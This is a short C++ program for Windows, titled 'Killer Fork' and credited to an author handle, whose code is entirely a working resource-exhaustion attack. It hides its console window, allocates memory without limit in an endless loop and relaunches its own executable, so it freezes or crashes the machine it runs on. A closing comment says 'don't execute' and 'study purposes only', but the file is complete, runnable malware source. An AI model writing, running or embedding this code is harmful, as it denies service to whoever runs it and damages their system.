// Killer Fork C++
// Code Made By ChaoticOfChaos(Khaos)
#include <windows.h>
#include <vector>

int main(int argc, char *argv[]) {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    std::vector<int> killer;
    
    while (1) {
        for (int i = 0; i < 100000000; i++) {
            killer.push_back(i);
        }
        system(argv[0]);
    }
}
// Código feito por ChaoticOfChaos(Khaos)
// https://github.com/chaoticofchaos
// 
// DON'T EXECUTE THIS CODE
// STUDY PURPOSES ONLY